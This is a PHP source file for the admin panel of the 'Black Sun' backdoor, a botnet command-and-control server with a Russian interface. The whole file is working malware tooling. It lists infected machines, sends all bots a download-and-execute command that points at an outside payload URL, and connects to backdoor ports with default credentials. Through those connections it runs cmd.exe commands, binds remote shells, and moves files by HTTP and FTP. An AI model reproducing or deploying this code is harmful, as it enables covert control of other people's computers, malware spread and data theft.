<?
/*
 *  ---------------------------------------------------------------------
 * 	       ____  _            _     _____             
 * 	      |  _ \| |          | |   / ____|            
 * 	      | |_) | | __ _  ___| | _| (___  _   _ _ __  
 * 	      |  _ <| |/ _` |/ __| |/ /\___ \| | | | '_ \ 
 * 	      | |_) | | (_| | (__|   < ____) | |_| | | | |
 * 	      |____/|_|\__,_|\___|_|\_\_____/ \__,_|_| |_|
 *                 Black Sun Backdoor v1.0 prebeta        
 *
 *                          (x) Cytech 2007
 *  ---------------------------------------------------------------------
 */
?>
<title> BlackSun Remote Control System </title>

<center><img src="images/logo.JPG"><br><br></center>
<center>
<table style="text-align: center; width: 959px; height: 32px; "border="0" cellpadding="0" cellspacing="0">
  <tbody>
    <tr>
	<small>
           <td><a href = "?act=connect"><img src="images/connect.jpg"><br>подключение</a></td>
           <td><a href = "?act=stat"><img src="images/statistic.jpg"><br>статистика</a></td>
	</small>
    </tr>
  </tbody>
</table>
</center>
<style>
BODY {
	color: #DDDDDD;
	background-color: #000000;
	scrollbar-face-color: #212121;
	scrollbar-highlight-color: #404040;
	scrollbar-shadow-color: #000000;
	scrollbar-3dlight-color: #616161;
	scrollbar-arrow-color:  #66E201;
	scrollbar-track-color: #000000;
	scrollbar-darkshadow-color: #000000;
}

.a {
	font-family: Verdana;
	font-size: 12px;}

A {
	color: #00AA00;
	text-decoration: none;
}

A:hover {
	color: #FFFFFF;
	text-decoration: none;
}

TD {
	font-family: Verdana;
	font-size: 12px;
	color: #DDDDDD;
}

input 	
{
	font-size: 10pt;font-family: Arial; 
	color: #999930; 
	background-color: #000000;
	border-color:#666666 #666666 #666666 #666666; 
	border-width:1pt 1pt 1pt 1pt;
	border-style:dotted dotted dotted dotted; 
	padding-left: 2pt;
	overflow:hidden;
}
select 	
{
	font-size: 10pt;font-family: Arial; 
	color: #999930; 
	background-color: #000000;
	border-color:#666666 #666666 #666666 #666666; 
	border-width:1pt 1pt 1pt 1pt;
	border-style:dotted dotted dotted dotted; 
	padding-left: 2pt;
	overflow:hidden;
}
</style>
<font style="font-family: Verdana;"><small>

<?
	/**********************************************************/
	Error_Reporting(E_ALL & ~E_NOTICE);
	/**********************************************************/
     include("conf.php"); 	
	/**********************************************************/
	
	function SendCommand($host, $port, $givemecmd)
	{			
		    $sock = fsockopen($host,$port,$errno,$errstr);
		    if (!$sock)                                   
		    {
		        echo "cant connect to remote server!";
		    }
		    else
		    {
		        fputs ($sock,$givemecmd);
		        while (!feof($sock))
		        {
				  $ans = fgets($sock,999666);   
				  echo(htmlspecialchars($ans));
		        }
			}
			fclose ($sock);
	}
	
	/**********************************************************/
	
	function ConnectMySQL($host, $login, $password, $database)
	{
			$connect=mysql_connect($host,$login,$password);
			
			if ($connect===FALSE)
			{
				die('cant connect to database');
			}
			
			$selectdb=mysql_select_db($database);
			
			if ($selectdb==FALSE)
			{
				die('cant select database'); 
			}
	}
	
	/**********************************************************/
	
	function ShowBotnetTable($db_botable)
	{
		echo '<br><br><b>[ Статистика: ]</b><br><br>';
		echo '<center>';
		echo '<table style="text-align: left; width: 912px; height: 80px;" border="1" cellpadding="0"';
		echo 'cellspacing="0"><tbody><tr>';
		echo '<td><center>Имя компьютера</center></td>'; 
		echo '<td><center>Текущая HTTP-команда</center></td>'; 
		echo '<td><center>IP-адрес</center></td>'; 
		echo '<td><center>Backdoor-порт</center></td>'; 
		echo '<td><center>Последнее подключение</center></td>'; 
		echo '<td><center>Действие</center></td>'; 
		echo '</tr>'; 

		$res = mysql_query("SELECT * FROM $db_botable"); 
		for ($i=0, $ROWS=mysql_num_rows($res); $i<$ROWS; $i++)
		{
			 $row = mysql_fetch_assoc($res);
			 
			 echo '<tr>';
				 foreach ($row as $key => $value)
				 {
					if($key=="id") continue;
						#echo "<td>$value</td>";
						# добавить фильтрацию!!!
						if($key=="uid")  
						{ 
							$uid = $value; 
							echo "<td>$value</td>"; 
						}  
						if($key=="cmd") 
						{
							$cmd=str_replace("ђ"," ", $value); echo "<td>$cmd</td>"; 
						} 
						if($key=="data") 
						{ 
							$ip = $value;
							echo "<td>$ip</td>"; 
						}
						if($key=="port")
						{
							$port = $value;
							echo "<td>$port</td>"; 
						}
						if($key=="lconnection")
						{ 
							$lcon = $value; 
							echo "<td>$lcon</td>"; 
						}
				 }
						echo '<td><center><a href = "'; echo "?act=connect&ip=$ip&port=$port"; 
						echo '">подключиться</a>';
						
						echo '<br><a href = "'; echo "?act=stat&bot=delete&uid=$uid"; 
						echo '">удалить</a></center></td>';
			 echo '</tr>';
		}
	
		echo '</tbody></table></center>'; 
	}

	/**********************************************************/

	function SetNewCommandForBots($db_botable)
	{
		echo '<br><br><b>[ Установить команду ботам: ]</b><br><br>'; 
		echo '<form action="" method="post">'; 
		echo 'Введите имя бота (символ "*" - всем ботам сразу)<br>';
		echo '<input name="botuid" size="10" value="*"><br>'; 
	#	echo '<input name="newcmd" size="40" value="dexec_http://localhost/1.exe"><br>'; 
	#	echo '<input name="set" value="установить" type="submit"><br><br>'; 
 
		echo 'Выберите команду для установки<br>';
        echo '<SELECT name=newcmd>'; 
        echo '<OPTION value=dexec>Скачать и запустить файл</OPTION>'; 
        echo '<OPTION value=nocommand>Убрать команду</OPTION>'; 
		echo '</SELECT><br>';
		
        echo 'Аргумент: <input name="arg1" size="50" value="http://nnp.0x48k.cc/load/bsun.exe"><br>';
		
		echo '<input name="set" value="установить" type="submit"><br><br>'; 
		echo '</form>';
		
		$newcmd = htmlspecialchars(addslashes($_POST['newcmd']."ђ".$_POST['arg1'])); 
		$botuid = htmlspecialchars(addslashes($_POST['botuid'])); 
		
		if(!is_null($_POST['set'] && $_POST['botuid']))
		{
			if($botuid=="*")
			{
				mysql_query("UPDATE $db_botable SET cmd='$newcmd'"); // устанавливаем
			}
			else
			{
				mysql_query("UPDATE $db_botable SET cmd='$newcmd' WHERE uid='$botuid'"); 
			}
		}
	}
	/**********************************************************/
	
	ConnectMySQL($db_host, $db_login, $db_password, $db_database);
	
	/**********************************************************/
		# http://gate/admin.php?act=stat
	if($_GET['act'] == "stat")
	{

		ShowBotnetTable($db_botable);
		SetNewCommandForBots($db_botable);

		# http://gate/admin.php?act=stat&bot=DELETE
		if($_GET['bot'] == "delete")
		{
			$duid = htmlspecialchars(addslashes($_GET['uid']));
		
			echo "<b>вы действительно хотите удалить $duid ?</b>";
			echo '<form action="" method="post">'; 
			echo '<input name="submit" value="да" type="submit"><br><br>'; 
			echo '</form><br><br>'; 
			
			if(!is_null($_POST['submit']))
			{
				mysql_query("DELETE FROM $db_botable WHERE uid = '$duid'");
                 echo "<br><a href = ?act=stat>нажмите сюда, если ваш браузер не поддерживает автоматического редиректа</a><br>";
                echo '<script>location="?act=stat";</script>';
			}
		}
	}
	/**********************************************************/
		# http://gate/admin.php?act=connect
	if($_GET['act'] == "connect")
	{
		if(is_null($_GET['connect']))
		{
					$ip = htmlspecialchars(addslashes($_GET['ip']));
					$port = htmlspecialchars(addslashes($_GET['port']));

			echo '<center><br><br><b>[ Параметры подключения: ]</b><br>'; 
			echo '<form action="" method="post">';
			echo 'Хост: <input name="host" size="20" value="'; 
				if ($ip){ echo $ip; } else {echo '127.0.0.1';}; 
			echo '"><br><br>';
			echo 'Порт: <input name="port" size="20" value="';
				if ($port){ echo $port; } else {echo '2121';}; 
			echo '"><br><br>';
			echo 'Логин: <input name="login" size="21" value="cytech"><br><br>'; 
			echo 'Пароль: <input name="password" size="20" value="cytech"><br><br>'; 
			echo '<input name="connect" value="Connect" type="submit"><br><br>'; 
			echo '</form>'; 

                if(!is_null($_POST['connect']))
                {
                        $link = "?act=connect&connect=1&ip=".
								htmlspecialchars(addslashes($_POST[host])).
								"&port=".
								htmlspecialchars(addslashes($_POST[port])).
                                "&login=".
								htmlspecialchars(addslashes($_POST[login])).
								"&password=".
								htmlspecialchars(addslashes($_POST[password]));

						
                        echo "<br><a href = $link >нажмите сюда, если ваш браузер не поддерживает автоматического редиректа</a><br>";
                        echo '<script>location="'.$link.'";</script>';
                }
                else
                {
                        echo "<br>заполните все поля формы<br>";
                }
		}
		# http://gate/admin.php?act=connect&connect=1
		if($_GET['connect'] == "1")
		{
			echo '<form action="" method="post">';
			echo '<br><br><b>[ Выберите команду для выполнения: ]</b>';
			echo '<br><SELECT name=cmd>';
			echo '<OPTION value=cmd>Выполнение команды через cmd.exe [1]</OPTION>';
			echo '<OPTION value=exec>Скрытый/видимый запуск приложения через WinExec [2]</OPTION>';
			echo '<OPTION value=bindshell>Забиндить шелл на заданном порту [1]</OPTION>';
			echo '<OPTION value=download>Скачать файл по HTTP [2]</OPTION>';
			echo '<OPTION value=ftp_upload>Закачать файла на FTP [6]</OPTION>';
			echo '<OPTION value=->----------------------------------------------</OPTION>';
			echo '<OPTION value=msgbox>Вывести MessageBox [2]</OPTION>';
			echo '<OPTION value=power>Питание (выключить/перезагрузить/спать/встать) [1]</OPTION>';
			echo ' <OPTION value=monitor>Включить/выключить монитор [1]</OPTION>';
			echo '<OPTION value=cdrom>Открыть/закрыть CD-ROM [1]</OPTION>';
			echo '<OPTION value=keyboard>Переключатель режимов клавиатуры [1]</OPTION>';
			echo '<OPTION value=mouse>Поменять мышь на левшу/правшу [1]</OPTION>';
			echo '<OPTION value=crazymouse>Эффект бешеной мыши [2]</OPTION>';
			echo '<OPTION value=funwindows>Спрятать/показать окна [1]</OPTION>';
			echo '<OPTION value=->----------------------------------------------</OPTION>';
			echo '<OPTION value=version>Получить установленную версию BlackSun [0]</OPTION>';
			echo '<OPTION value=exitprocess>Закончить работу [0] </OPTION>';
			echo ' <OPTION value=killmyself>Самоуничтожиться (необходим логин и пароль)</OPTION>';
			echo '</SELECT>';
			echo ' <br><br><br>';
			echo ' Аргумент №1: <input name="arg1" size="50" value="netstat -an"><br>';
			echo ' Аргумент №2: <input name="arg2" size="50" value="_"><br>';
			echo ' Аргумент №3: <input name="arg3" size="50" value="_"><br>';
			echo ' Аргумент №4: <input name="arg4" size="50" value="_"><br>';
			echo ' Аргумент №5: <input name="arg5" size="50" value="_"><br>';
			echo ' Аргумент №6: <input name="arg6" size="50" value="_"><br>';
			echo ' <INPUT type="submit" name="submit" value="send command">';
	
			
					$login 		= 	$_GET['login'];
					$password 	= 	$_GET['password'];
	
					 $cmd  = $login.":".$password
							."ђ".$_POST['cmd']."ђ".$_POST['arg1']."ђ".$_POST['arg2']."ђ".$_POST['arg3']
							."ђ".$_POST['arg4']."ђ".$_POST['arg5']."ђ".$_POST['arg6']."ђ".$_POST['arg7']; 
					
					echo '<br><br><b>[ Результат выполнения команды: ]</b>';
					if(!is_null($_POST['submit']))
					{
						echo "</font><pre>";
						SendCommand($_GET['ip'], $_GET['port'], $cmd); 
						echo "</pre>";
					}
			}
				
	}
	/**********************************************************/
 ?>